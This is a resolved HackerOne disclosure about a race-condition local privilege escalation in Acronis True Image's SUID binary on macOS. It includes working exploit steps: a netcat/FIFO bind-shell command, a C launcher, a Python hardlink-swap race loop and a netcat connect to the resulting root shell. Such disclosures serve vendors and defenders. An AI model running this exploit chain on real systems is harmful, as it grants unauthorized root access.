---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/privilege-escalation
  - env/web
  - vuln/sql-injection
  - vuln/command-injection
  - vuln/code-injection
  - vuln/broken-access-control
  - vuln/privilege-escalation
  - vuln/race-condition
  - trigger/admin-required
  - trigger/race-window
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2022-07-28
submitted: 2021-07-05T03:49:58.358Z
bounty_usd: null
votes: 8
cve: []
program: "[[programs/acronis|Acronis]]"
reporter: "vkas-afk"
source: "https://hackerone.com/reports/1251464"
title: "Acronis True Image Local Privilege Escalation Due To Race Condition In Application Verification "
---
# Acronis True Image Local Privilege Escalation Due To Race Condition In Application Verification 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** Acronis | **Disclosed:** 2022-07-28

- Report: [https://hackerone.com/reports/1251464](https://hackerone.com/reports/1251464)
- CWE: Privilege Escalation
- Submitted: 2021-07-05T03:49:58.358Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
The Acronis True Image application has a SUID binary "Acronis True Image" that starts another binary "console" in the same directory. The SUID binary does some checks on "console" before it is run to make sure the correct binary is being run. By using a hardlink to the SUID binary we can coerice it to try and load "console" in a chosen directory we can write to. From this point we can exploit that the SUID binary does not lock "console" whilst it checks if it is valid, we setup a environment where we can replace console at will and try to win a race where we replace the "console" binary **after** it has been checked but **before** it has been run. If we win this race we gain code execution as root from an admin account. 

## Steps To Reproduce
first we make the shell command to run 
```bash
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell 
```
now lets make the c program that will run this shell command naming it test.c
```c
#include <stdlib.h>
int main() 
{
	system("touch pass;bash shell");
	return 0;
}
```
compile the program
```bash
gcc test.c 
```
run the following python program
```python
import os 
import time 

os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")

lag = 0.01 
while True: 
	os.popen("./run")
	time.sleep(lag)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	lag += 0.01 
	if os.path.exists("./pass"):
		exit()
```
connect to the root shell
```bash
nc 127.0.0.1 8080
```
## Recommendations
Any binaries that are checked for validity should be locked so that they can not be replaced during validation. Additionally if possible the application should verify where it is being run from to try and prevent further symlink attacks.

## Impact

Local privilege escalation to root.

## Timeline

- **Report Filed**
- **2021-07-05** @security-bot: Hi @vkas-afk

Thanks for participating in Acronis bug bounty program!
Our security team usually replies within 1-2 business days.

Meanwhile, I'd recommend you to check out our [policy](https://hackerone.com/acronis).
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2022-07-28** @vkas-afk: I can no longer reproduce the issue.
- **Agreed On Going Public**
- **Report Became Public**
